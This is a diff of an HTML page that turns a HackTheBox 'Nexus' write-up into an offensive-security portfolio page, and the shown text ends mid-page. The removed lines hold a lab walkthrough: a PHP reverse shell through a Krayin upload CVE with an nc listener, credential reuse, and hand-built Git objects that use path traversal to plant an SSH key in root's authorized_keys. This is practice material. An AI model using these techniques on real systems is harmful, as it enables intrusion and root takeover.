@@ -3,20 +3,41 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Joseph Quintana — Nexus (HackTheBox)</title>
+<title>Joseph Quintana — Offensive Security Portfolio</title>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 :root {
---bg: #09111a; --surface: #0e1925;
---border: #1c2d40; --border2: #243850;
---accent: #ff3b57; --accent-dim: rgba(255,59,87,0.08); --accent-border: rgba(255,59,87,0.18);
---text: #c8dced; --text-dim: #4e6880; --text-mid: #7a9ab8;
---mono: 'JetBrains Mono', monospace; --sans: 'Inter', sans-serif;
+--bg: #09111a;
+--surface: #0e1925;
+--surface2: #131f2e;
+--border: #1c2d40;
+--border2: #243850;
+--accent: #ff3b57;
+--accent-dim: rgba(255,59,87,0.08);
+--accent-border: rgba(255,59,87,0.18);
+--blue: #4a9eff;
+--blue-dim: rgba(74,158,255,0.07);
+--blue-border: rgba(74,158,255,0.16);
+--danger: #ff3b57;
+--danger-dim: rgba(255,59,87,0.08);
+--danger-border: rgba(255,59,87,0.22);
+--text: #c8dced;
+--text-dim: #4e6880;
+--text-mid: #7a9ab8;
+--mono: 'JetBrains Mono', monospace;
+--sans: 'Inter', sans-serif;
 }
 html { scroll-behavior: smooth; }
-body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; position: relative; }
+body {
+background: var(--bg);
+color: var(--text);
+font-family: var(--sans);
+min-height: 100vh;
+overflow-x: hidden;
+position: relative;
+}
 body::before {
 content: "";
 position: fixed;
@@ -33,198 +54,585 @@ background: repeating-linear-gradient(
 }
 nav, .container { position: relative; z-index: 1; }
 @media (prefers-reduced-motion: reduce) {
-  .cursor { animation: none !important; }
+  .status-dot, .cursor, .fade-in { animation: none !important; }
 }
-.container { max-width: 760px; margin: 0 auto; padding: 0 2rem; }
+.container {
+max-width: 900px;
+margin: 0 auto;
+padding: 0 2rem;
+}
 /* NAV */
-nav { position: sticky; top: 0; z-index: 100; background: rgba(7,11,16,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 0.9rem 0; }
-nav .container { display: flex; align-items: center; justify-content: space-between; }
-.nav-logo { font-family: var(--mono); font-size: 12px; color: var(--text-mid); letter-spacing: 0.05em; }
-.nav-back { display: flex; align-items: center; gap: 6px; font-family: var(--sans); font-size: 13px; color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
-.nav-back:hover { color: var(--accent); }
-/* HEADER */
-.post-header { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); margin-bottom: 2.5rem; }
-.post-header-row { display: flex; align-items: center; gap: 1rem; margin-bottom: 0.6rem; }
-.post-logo { width: 56px; height: 56px; border-radius: 50%; flex-shrink: 0; }
-.post-title { font-size: clamp(1.8rem, 4vw, 2.4rem); font-weight: 600; color: #e8f4ff; letter-spacing: -0.01em; }
-.post-meta { font-family: var(--mono); font-size: 13px; color: var(--text-dim); }
-.post-meta span { color: var(--accent); }
-/* CONTENT */
-.content { padding-bottom: 4rem; }
-.content h2 { font-size: 19px; font-weight: 600; color: var(--text); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
-.content h2:first-child { margin-top: 0; }
-.content p { font-size: 15px; color: var(--text-mid); line-height: 1.75; margin-bottom: 1rem; }
-.content ul, .content ol { padding-left: 1.4rem; margin-bottom: 1rem; }
-.content li { font-size: 15px; color: var(--text-mid); line-height: 1.75; margin-bottom: 0.35rem; }
-.content strong { color: var(--text); font-weight: 600; }
-.content code { font-family: var(--mono); font-size: 13px; color: var(--accent); background: var(--surface); padding: 1px 5px; border-radius: 3px; }
-.content pre { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
-.content pre code { color: var(--text); background: none; padding: 0; font-size: 13px; line-height: 1.6; white-space: pre; }
-.content img { width: 100%; border-radius: 6px; border: 1px solid var(--border); margin: 1rem 0; display: block; }
-/* BACK LINK */
-.post-nav { margin: 3rem 0 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border); }
-.post-nav a { display: inline-flex; align-items: center; gap: 6px; font-size: 13px; color: var(--text-dim); text-decoration: none; }
-.post-nav a:hover { color: var(--accent); }
+nav {
+position: sticky;
+top: 0;
+z-index: 100;
+background: rgba(7,11,16,0.85);
+backdrop-filter: blur(12px);
+border-bottom: 1px solid var(--border);
+padding: 0.9rem 0;
+}
+nav .container {
+display: flex;
+align-items: center;
+justify-content: space-between;
+}
+.nav-logo {
+font-family: var(--mono);
+font-size: 12px;
+color: var(--text-mid);
+letter-spacing: 0.05em;
+}
+.nav-links {
+display: flex;
+gap: 1.5rem;
+list-style: none;
+}
+.nav-links a {
+font-family: var(--sans);
+font-size: 13px;
+color: var(--text-dim);
+text-decoration: none;
+letter-spacing: 0.01em;
+transition: color 0.2s;
+}
+.nav-links a:hover { color: var(--accent); }
+.nav-status {
+display: flex;
+align-items: center;
+gap: 6px;
+font-family: var(--sans);
+font-size: 13px;
+color: var(--text-dim);
+}
+.status-dot {
+width: 7px; height: 7px;
+border-radius: 50%;
+background: #c22943;
+animation: pulse 2s infinite;
+}
+@keyframes pulse {
+0%, 100% { opacity: 1; }
+50% { opacity: 0.4; }
+}
+/* HERO */
+.hero {
+padding: 6rem 0 4rem;
+}
+.hero-eyebrow {
+font-family: var(--mono);
+font-size: 11px;
+color: var(--text-dim);
+letter-spacing: 0.12em;
+text-transform: uppercase;
+margin-bottom: 1.25rem;
+}
+.hero-name {
+font-size: clamp(2.2rem, 5vw, 3.5rem);
+font-weight: 600;
+color: #e8f4ff;
+line-height: 1.1;
+margin-bottom: 0.75rem;
+letter-spacing: -0.01em;
+}
+.hero-name span { color: var(--accent); }
+.hero-role {
+font-family: var(--mono);
+font-size: 13px;
+color: var(--blue);
+margin-bottom: 1.75rem;
+letter-spacing: 0.03em;
+}
+.hero-bio {
+font-size: 15px;
+color: var(--text-mid);
+line-height: 1.8;
+max-width: 600px;
+margin-bottom: 2.5rem;
+}
+.hero-bio strong { color: var(--text); }
+.hero-actions {
+display: flex;
+gap: 12px;
+flex-wrap: wrap;
+}
+.btn {
+display: inline-flex;
+align-items: center;
+gap: 8px;
+padding: 10px 20px;
+border-radius: 6px;
+font-family: var(--sans);
+font-size: 13px;
+font-weight: 500;
+text-decoration: none;
+letter-spacing: 0.01em;
+transition: all 0.2s;
+cursor: pointer;
+border: none;
+}
+.btn-primary {
+background: var(--accent-dim);
+color: var(--accent);
+border: 1px solid var(--accent-border);
+}
+.btn-primary:hover {
+background: rgba(255,59,87,0.2);
+border-color: var(--accent);
+}
+.btn-secondary {
+background: transparent;
+color: var(--text-mid);
+border: 1px solid var(--border2);
+}
+.btn-secondary:hover {
+color: var(--text);
+border-color: var(--text-dim);
+}
+/* STATS */
+.stats {
+display: grid;
+grid-template-columns: repeat(4, 1fr);
+border: 1px solid var(--border);
+border-radius: 10px;
+overflow: hidden;
+margin-bottom: 5rem;
+background: var(--surface);
+}
+.stat {
+padding: 1.5rem;
+border-right: 1px solid var(--border);
+text-align: center;
+}
+.stat:last-child { border-right: none; }
+.stat-num {
+font-family: var(--mono);
+font-size: 24px;
+font-weight: 700;
+color: #f0f8ff;
+margin-bottom: 4px;
+}
+.stat-lbl {
+font-size: 12px;
+color: var(--text-dim);
+font-family: var(--sans);
+}
+/* SECTIONS */
+section { margin-bottom: 5rem; }
+.section-header {
+display: flex;
+align-items: center;
+gap: 12px;
+margin-bottom: 2rem;
+}
+.section-label {
+font-family: var(--sans);
+font-size: 11px;
+font-weight: 600;
+color: var(--text-dim);
+letter-spacing: 0.1em;
+text-transform: uppercase;
+}
+.section-line {
+flex: 1;
+height: 1px;
+background: var(--border);
+}
+.section-label::before {
+content: "$ ";
+color: var(--accent);
+opacity: 0.7;
+}
+/* TERMINAL — hero signature element */
+.term {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 10px;
+overflow: hidden;
+max-width: 600px;
+margin-bottom: 3rem;
+box-shadow: 0 0 0 1px rgba(255,59,87,0.03), 0 20px 40px -20px rgba(255,59,87,0.08);
+}
+.term-bar {
+display: flex;
+align-items: center;
+gap: 8px;
+padding: 0.65rem 1rem;
+background: var(--surface2);
+border-bottom: 1px solid var(--border);
+}
+.term-dot { width: 9px; height: 9px; border-radius: 50%; }
+.term-dot.r { background: #ff5f57; }
+.term-dot.y { background: #febc2e; }
+.term-dot.g { background: #28c840; }
+.term-title { margin-left: 8px; font-family: var(--mono); font-size: 11px; color: var(--text-dim); }
+.term-body { padding: 1rem 1.25rem; font-family: var(--mono); font-size: 12.5px; line-height: 1.9; }
+.term-body .prompt { color: var(--accent); }
+.term-body .path { color: var(--blue); }
+.term-body .out { color: var(--text-mid); }
+.term-body .out strong { color: var(--text); font-weight: 500; }
+.term-body .crit { color: var(--danger); }
+.cursor {
+display: inline-block;
+width: 7px;
+height: 1em;
+background: var(--accent);
+margin-left: 3px;
+vertical-align: text-bottom;
+animation: blink 1s steps(1) infinite;
+}
+@keyframes blink { 50% { opacity: 0; } }
+/* EDUCATION */
+.edu-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+}
+.edu-card {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 1.25rem 1.5rem;
+transition: border-color 0.2s;
+}
+.edu-card:hover { border-color: var(--border2); }
+.edu-degree {
+font-family: var(--mono);
+font-size: 11px;
+color: var(--accent);
+margin-bottom: 6px;
+letter-spacing: 0.05em;
+}
+.edu-field {
+font-size: 14px;
+font-weight: 600;
+color: var(--text);
+margin-bottom: 4px;
+}
+.edu-sub { font-size: 12px; color: var(--text-dim); }
+/* CERTS */
+.cert-grid {
+display: grid;
+grid-template-columns: repeat(3, 1fr);
+gap: 10px;
+}
+.cert-card {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 1rem 1.25rem;
+display: flex;
+align-items: center;
+gap: 10px;
+transition: border-color 0.2s, background 0.2s;
+}
+.cert-card:hover {
+border-color: var(--accent-border);
+background: var(--accent-dim);
+}
+.cert-badge {
+font-family: var(--mono);
+font-size: 10px;
+color: var(--accent);
+background: var(--accent-dim);
+border: 1px solid var(--accent-border);
+border-radius: 4px;
+padding: 3px 8px;
+white-space: nowrap;
+flex-shrink: 0;
+}
+.cert-name { font-size: 12px; color: var(--text-mid); }
+/* TECH */
+.tech-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+}
+.tech-card {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 10px;
+overflow: hidden;
+}
+.tech-card-head {
+padding: 0.65rem 1rem;
+border-bottom: 1px solid var(--border);
+display: flex;
+align-items: center;
+gap: 8px;
+font-size: 13px;
+font-weight: 500;
+font-family: var(--sans);
+color: var(--text-mid);
+}
+.tech-card-head i { font-size: 15px; color: var(--text-dim); }
+.tech-card-body {
+padding: 0.75rem 1rem;
+display: flex;
+flex-wrap: wrap;
+gap: 6px;
+}
+.chip {
+font-size: 11px;
+padding: 4px 10px;
+border-radius: 5px;
+border: 1px solid;
+font-family: var(--mono);
+letter-spacing: 0.02em;
+transition: opacity 0.15s;
+}
+.chip:hover { opacity: 0.75; }
+.chip-1 { color: #ff3b57; border-color: rgba(255,59,87,0.22); background: rgba(255,59,87,0.07); }
+.chip-2 { color: #34b8d4; border-color: rgba(52,184,212,0.22); background: rgba(52,184,212,0.07); }
+.chip-3 { color: #5a9ef5; border-color: rgba(90,158,245,0.22); background: rgba(90,158,245,0.07); }
+.chip-4 { color: #4a9eff; border-color: rgba(74,158,255,0.22); background: rgba(74,158,255,0.07); }
+.chip-5 { color: #ff3b57; border-color: rgba(255,59,87,0.24); background: rgba(255,59,87,0.07); }
+/* PROJECTS */
+.proj-empty {
+border: 1px dashed var(--border2);
+border-radius: 10px;
+padding: 4rem 2rem;
+text-align: center;
+}
+.proj-empty-icon { font-size: 36px; color: var(--text-dim); margin-bottom: 1rem; }
+.proj-empty-title { font-size: 15px; font-weight: 600; font-family: var(--sans); color: var(--text-mid); margin-bottom: 0.5rem; }
+.proj-empty-sub { font-size: 13px; font-family: var(--sans); color: var(--text-dim); line-height: 1.6; margin-bottom: 1rem; }
+.proj-empty-tag {
+display: inline-block;
+font-family: var(--mono);
+font-size: 11px;
+color: var(--text-dim);
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 4px;
+padding: 4px 12px;
+}
 /* FOOTER */
-footer { border-top: 1px solid var(--border); padding: 2rem 0; }
-footer .container { display: flex; align-items: center; justify-content: space-between; }
-.footer-left { font-size: 13px; color: var(--text-dim); }
+footer {
+border-top: 1px solid var(--border);
+padding: 2rem 0;
+margin-top: 2rem;
+}
+footer .container {
+display: flex;
+align-items: center;
+justify-content: space-between;
+}
+.footer-left { font-family: var(--sans); font-size: 13px; color: var(--text-dim); }
 .footer-links { display: flex; gap: 10px; }
-.btn { display: inline-flex; align-items: center; gap: 8px; padding: 9px 18px; border-radius: 6px; font-size: 13px; font-weight: 500; text-decoration: none; transition: all 0.2s; }
-.btn-primary { background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent-border); }
-.btn-primary:hover { background: rgba(255,59,87,0.15); border-color: var(--accent); }
-.btn-secondary { background: transparent; color: var(--text-mid); border: 1px solid var(--border2); }
-.btn-secondary:hover { color: var(--text); border-color: var(--text-dim); }
+/* ANIMATIONS */
+.fade-in {
+opacity: 0;
+transform: translateY(20px);
+animation: fadeUp 0.6s ease forwards;
+}
+@keyframes fadeUp {
+to { opacity: 1; transform: translateY(0); }
+}
+.fade-in:nth-child(1) { animation-delay: 0.1s; }
+.fade-in:nth-child(2) { animation-delay: 0.2s; }
+.fade-in:nth-child(3) { animation-delay: 0.3s; }
+.fade-in:nth-child(4) { animation-delay: 0.4s; }
+/* RESPONSIVE */
+@media (max-width: 640px) {
+.stats { grid-template-columns: repeat(2, 1fr); }
+.stat:nth-child(2) { border-right: none; }
+.stat:nth-child(3), .stat:nth-child(4) { border-top: 1px solid var(--border); }
+.edu-grid { grid-template-columns: 1fr; }
+.cert-grid { grid-template-columns: 1fr 1fr; }
+.tech-grid { grid-template-columns: 1fr; }
+nav .nav-links { display: none; }
+nav .nav-status { display: none; }
+}
 </style>
 </head>
 <body>
 
 <nav>
 <div class="container">
-<div class="nav-logo">// writeups</div>
-<a href="index.html" class="nav-back"><i class="ti ti-arrow-left"></i>Go back to portfolio</a>
+<div class="nav-logo">// portfolio</div>
+<ul class="nav-links">
+<li><a href="#education">Education</a></li>
+<li><a href="#certs">Certs</a></li>
+<li><a href="#tech">Tech</a></li>
+<li><a href="#projects">Projects</a></li>
+<li><a href="#writeups">Writeups</a></li>
+</ul>
+<div class="nav-status"><span class="status-dot"></span>engagement: available</div>
 </div>
 </nav>
 
 <div class="container">
 
-<div class="post-header">
-<div class="post-header-row">
-<img src="images/nexus/logo.png" alt="Nexus HackTheBox machine icon" class="post-logo" />
-<h1 class="post-title">Nexus</h1>
+<!-- HERO -->
+<div class="hero">
+<h1 class="hero-name fade-in">Joseph<br><span>Quintana</span><span class="cursor" aria-hidden="true"></span></h1>
+<div class="hero-role fade-in">Penetration Testing &nbsp;·&nbsp; Adversary Emulation &nbsp;·&nbsp; Threat Detection Background</div>
+<p class="hero-bio fade-in">
+Offensive security professional with hands-on experience in <strong>penetration testing, vulnerability exploitation, and adversary emulation</strong>, backed by a defender's insight from prior work with <strong>EDR and SIEM platforms</strong>. Focused on identifying and exploiting real-world attack paths to help organizations find weaknesses before adversaries do.
+</p>
+
+<div class="term fade-in">
+<div class="term-bar">
+<span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+<span class="term-title">jqcyber@offsec: ~</span>
 </div>
-<div class="post-meta">HackTheBox · <span>Easy</span> · Linux</div>
+<div class="term-body">
+<div><span class="prompt">jqcyber@offsec</span><span class="path">:~$</span> whoami</div>
+<div class="out">joseph_quintana — offensive security</div>
+<div>&nbsp;</div>
+<div><span class="prompt">jqcyber@offsec</span><span class="path">:~$</span> cat target.role</div>
+<div class="out"><strong>Penetration Tester</strong> · open to engagements</div>
+<div>&nbsp;</div>
+<div><span class="prompt">jqcyber@offsec</span><span class="path">:~$</span> id</div>
+<div class="out">uid=9(certified) groups=pentest,cysa,networking,linux</div>
+<div>&nbsp;</div>
+<div><span class="prompt">jqcyber@offsec</span><span class="path">:~$</span> <span class="cursor"></span></div>
 </div>
-
-<div class="content">
-
-<h2>Overview</h2>
-<p>Nexus was an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. Recovered a leaked <code>.env</code> credential from Git history, reused it to log into Krayin, and Krayin turned out to be vulnerable to an authenticated file-upload RCE. From there, LinPEAS handed over another set of creds that got reused over SSH, and a root-owned systemd timer syncing Gitea templates was the final piece — hand-crafted some Git objects to smuggle a path traversal payload into root's <code>authorized_keys</code>.</p>
-
-<h2>Recon</h2>
-<p>Started with a service/default NSE script nmap scan, as with any box.</p>
-<pre><code>nmap -sC -sV 10.129.89.114</code></pre>
-<pre><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Gitea: Git with a cup of tea
-|_http-server-header: nginx/1.24.0 (Ubuntu)</code></pre>
-<img src="images/nexus/01-nmap.jpg" alt="Nmap scan showing SSH and an nginx-fronted Gitea instance" />
-<p>Then searched on searchsploit for nginx and OpenSSH, but nothing was available. Decided to review the website.</p>
-
-<h2>Enumeration</h2>
-<p>Nothing seemed of interest on the site, with the exception of this particular email: <code>j.matthew@nexus.htb</code>. It looked useful and could be used for later.</p>
-<img src="images/nexus/02-website.jpg" alt="Nexus Energy Authority landing page with the leaked staff email" />
-<p>After running a gobuster vhost brute force, got some further useful findings. Added the domains to <code>/etc/hosts</code>.</p>
-<pre><code>gobuster vhost -u nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
-<img src="images/nexus/03-vhost-gobuster.jpg" alt="Gobuster vhost results revealing git.nexus.htb and billing.nexus.htb" />
-<p>Git page takes us to a git service. Billing then takes us to this admin login portal — Krayin, an open-source CRM.</p>
-<img src="images/nexus/04-gitea-api-krayin-login.jpg" alt="Gitea Swagger API docs and the Krayin admin login portal" />
-
-<p>Entered the previously found email into the reset password page. It then fails, and we see this pop-up which seems to contain request details.</p>
-<img src="images/nexus/05-password-reset.jpg" alt="Krayin recover-password form" />
-<img src="images/nexus/06-burp-leak.jpg" alt="Burp Suite response leaking internal Krayin controller details" />
-
-<p>Returned back to the Gitea page, and upon looking at it again, found there was a link to a git repo.</p>
-<img src="images/nexus/07-admin-repo.jpg" alt="admin's public krayin-docker-setup repository on Gitea" />
-<p>Upon inspection, some credentials were found, but not anything particularly of interest — the <code>DB_PASSWORD</code> field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.</p>
-<pre><code>git clone http://git.nexus.htb/admin/krayin-docker-setup
-cd krayin-docker-setup
-git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
-<img src="images/nexus/08-git-history-grep.jpg" alt="Grepping through git log -p output and finding the old password" />
-<p>Credentials were found!</p>
-<pre><code>-DB_PASSWORD=N27xh!!2ucY04
-+DB_PASSWORD=</code></pre>
-
-<h2>Foothold</h2>
-<p>Decided to use the same password using the <code>j.matthew@nexus.htb</code> account.</p>
-<img src="images/nexus/09-krayin-dashboard.jpg" alt="Logging into Krayin and landing on the dashboard" />
-<p>Credentials worked!</p>
-<p>Upon searching the version of Krayin, it seems this version had a CVE — <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory — so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.</p>
-<p>From here, downloaded the python POC and ran it against the billing subdomain.</p>
-<pre><code>python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
-
-nc -lvnp 4444</code></pre>
-<img src="images/nexus/10-cve-exploit-shell.jpg" alt="Running the Krayin CVE PoC and catching a www-data reverse shell" />
-<p>Got a shell as <code>www-data</code>.</p>
-
-<h2>Privilege Escalation</h2>
-<p>Then decided to run linpeas.</p>
-<img src="images/nexus/11-linpeas.jpg" alt="LinPEAS running on the target as www-data" />
-<p>Linpeas returned credentials. Tried sshing with those credentials for the <code>krayin</code> user, but had no luck — let's try <code>jones</code>.</p>
-<pre><code>ssh jones@10.129.89.28
-cat user.txt
-8a3fdb05504c0a99754de6b9dee757e0</code></pre>
-<img src="images/nexus/12-jones-userflag.jpg" alt="SSH login as jones and reading the user flag" />
-<p>It worked with jones! Here we get our user flag.</p>
-
-<p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need — a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
-<img src="images/nexus/13-timer-service.jpg" alt="Discovering the root-owned gitea-template-sync systemd timer" />
-<p>Below is the vulnerable code:</p>
-<pre><code>for mode, objhash, filepath in entries:
-    target = os.path.join(stage_path, filepath)
-    os.makedirs(os.path.dirname(target), exist_ok=True)
-    cat_result = subprocess.run(GIT + ['cat-file', 'blob', objhash], cwd=bare_path, ...)
-    with open(target, 'wb') as f:
-        f.write(cat_result.stdout)</code></pre>
-<p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which happily walks <code>..</code> sequences right out of the staging directory. A tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> gets written to the real path — and since the script runs as root, the write goes through.</p>
-<p>Normally you couldn't get away with this — the standard <code>git</code> client refuses to let a tree entry contain <code>..</code>. <code>git add</code>, <code>git commit</code>, even <code>git update-index --cacheinfo</code>, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety — only the porcelain commands do.</p>
-
-<p>We then create an SSH key.</p>
-<pre><code>ssh-keygen -t ed25519 -f /tmp/.k -N ''
-
-curl -X POST http://localhost:3000/api/v1/user/repos \
-  -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
-  -d '{"name":"rce","private":false}'
-
-curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
-  -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
-  -d '{"template":true}'</code></pre>
-<img src="images/nexus/14-sshkey-api-calls.jpg" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
-
-<p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
-<pre><code>def write_obj(data, t):
-    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
-    sha = hashlib.sha1(h + data).hexdigest()
-    d = os.path.join(".git", "objects", sha[:2])
-    os.makedirs(d, exist_ok=True)
-    open(os.path.join(d, sha[2:]), "wb").write(zlib.compress(h + data))
-    return sha
-
-blob = write_obj(pubkey.encode(), "blob")
-ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
-cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
-fir = write_obj(entry("40000", "root", cur), "tree")
-for i in range(4):
-    fir = write_obj(entry("40000", "..", fir), "tree")</code></pre>
-<img src="images/nexus/15-malicious-repo-init.jpg" alt="Initializing the local repo and setting the remote before crafting the objects" />
-
-<p>Then run <code>git push origin main</code>.</p>
-<pre><code>git push origin main</code></pre>
-<pre><code>[2026-08-16 08:38:42] Syncing template: jones/rce
-[2026-08-16 08:38:42]   synced: README.md
-[2026-08-16 08:38:42]   synced: ../../../../../root/.ssh/authorized_keys
-[2026-08-16 08:38:42] Template sync complete</code></pre>
-<img src="images/nexus/16-sync-root-access.jpg" alt="Sync log confirming the traversal write, followed by root SSH access" />
-<p>We've gained root access!</p>
-<pre><code>ssh -i /tmp/.k root@10.129.89.114
-whoami
-root
-cat root.txt
-96b92b80f17fb358d3de4ac2cc856ebe</code></pre>
-
-<div class="post-nav">
-<a href="index.html"><i class="ti ti-arrow-left"></i>Back to all writeups</a>
+</div>
 </div>
 
+<!-- STATS -->
+<div class="stats">
+<div class="stat"><div class="stat-num">9x</div><div class="stat-lbl">Certified</div></div>
+<div class="stat"><div class="stat-num">M.S.</div><div class="stat-lbl">Graduate degree</div></div>
+<div class="stat"><div class="stat-num">1–3</div><div class="stat-lbl">Years experience</div></div>
+<div class="stat"><div class="stat-num">Pentester</div><div class="stat-lbl">Target role</div></div>
 </div>
+
+<!-- EDUCATION -->
+<section id="education">
+<div class="section-header">
+<span class="section-label">Education</span>
+<div class="section-line"></div>
+</div>
+<div class="edu-grid">
+<div class="edu-card">
+<div class="edu-degree">M.S.</div>
+<div class="edu-field">Cybersecurity &amp; Information Assurance</div>
+<div class="edu-sub">Master of Science</div>
+</div>
+<div class="edu-card">
+<div class="edu-degree">B.S.</div>
+<div class="edu-field">Cybersecurity &amp; Information Assurance</div>
+<div class="edu-sub">Bachelor of Science</div>
+</div>
+</div>
+</section>
+
+<!-- CERTIFICATIONS -->
+<section id="certs">
+<div class="section-header">
+<span class="section-label">Certifications</span>
+<div class="section-line"></div>
+</div>
+<div class="cert-grid">
+<div class="cert-card"><span class="cert-badge">CompTIA</span><span class="cert-name">PenTest+</span></div>
+<div class="cert-card"><span class="cert-badge">CompTIA</span><span class="cert-name">CySA+</span></div>
+<div class="cert-card"><span class="cert-badge">CompTIA</span><span class="cert-name">Security+</span></div>
+<div class="cert-card"><span class="cert-badge">Cisco</span><span class="cert-name">CCNA</span></div>
+<div class="cert-card"><span class="cert-badge">CompTIA</span><span class="cert-name">A+</span></div>
+<div class="cert-card"><span class="cert-badge">CompTIA</span><span class="cert-name">Project+</span></div>
+<div class="cert-card"><span class="cert-badge">LPI</span><span class="cert-name">Linux Essentials</span></div>
+<div class="cert-card"><span class="cert-badge">LanguageCert</span><span class="cert-name">ITIL 4 Foundation</span></div>
+<div class="cert-card"><span class="cert-badge">Kaseya</span><span class="cert-name">VSA X Administrator</span></div>
+</div>
+</section>
+
+<!-- TECH -->
+<section id="tech">
+<div class="section-header">
+<span class="section-label">Technical Knowledge</span>
+<div class="section-line"></div>
+</div>
+<div class="tech-grid">
+<div class="tech-card">
+<div class="tech-card-head"><i class="ti ti-target" aria-hidden="true"></i>Offensive Tooling</div>
+<div class="tech-card-body">
+<span class="chip chip-5">NMap</span><span class="chip chip-5">Burp Suite</span><span class="chip chip-5">Gobuster / ffuf</span><span class="chip chip-5">Metasploit</span><span class="chip chip-5">LinPEAS / WinPEAS</span><span class="chip chip-5">sqlmap</span><span class="chip chip-5">Hashcat</span>
+</div>
+</div>
+<div class="tech-card">
+<div class="tech-card-head"><i class="ti ti-network" aria-hidden="true"></i>Networking</div>
+<div class="tech-card-body">
+<span class="chip chip-2">VLAN</span><span class="chip chip-2">TCP/IP</span><span class="chip chip-2">DHCP</span><span class="chip chip-2">DNS</span><span class="chip chip-2">VPN</span><span class="chip chip-2">EIGRP</span><span class="chip chip-2">RIP</span><span class="chip chip-2">OSPF</span><span class="chip chip-2">Firewall</span><span class="chip chip-2">ACLs</span>
+</div>
+</div>
+<div class="tech-card">
+<div class="tech-card-head"><i class="ti ti-code" aria-hidden="true"></i>Programming</div>
+<div class="tech-card-body">
+<span class="chip chip-3">Python</span><span class="chip chip-3">C</span><span class="chip chip-3">MySQL</span><span class="chip chip-3">PowerShell</span>
+</div>
+</div>
+<div class="tech-card">
+<div class="tech-card-head"><i class="ti ti-device-desktop" aria-hidden="true"></i>Operating Systems</div>
+<div class="tech-card-body">
+<span class="chip chip-4">Linux</span><span class="chip chip-4">Windows 10/11</span><span class="chip chip-4">Windows Server 2016/2022</span><span class="chip chip-4">MacOS</span><span class="chip chip-4">Cisco IOS</span><span class="chip chip-4">PfSense</span>
+</div>
+</div>
+<div class="tech-card">
+<div class="tech-card-head"><i class="ti ti-apps" aria-hidden="true"></i>Applications &amp; Platforms</div>
+<div class="tech-card-body">
+<span class="chip chip-4">VMware</span><span class="chip chip-4">Office 365 Admin</span><span class="chip chip-4">Active Directory</span><span class="chip chip-4">Entra ID</span><span class="chip chip-4">MS Intune</span><span class="chip chip-4">Defender for Endpoint</span><span class="chip chip-4">CloudFlare Zero Trust</span><span class="chip chip-4">Netwrix Endpoint Protector</span><span class="chip chip-4">Datto EDR</span><span class="chip chip-4">RocketCyber SIEM</span><span class="chip chip-4">Kaseya VSA X</span><span class="chip chip-4">Inky</span>
+</div>
+</div>
+</div>
+</section>
+
+<!-- PROJECTS -->
+<section id="projects">
+<div class="section-header">
+<span class="section-label">Projects</span>
+<div class="section-line"></div>
+</div>
+
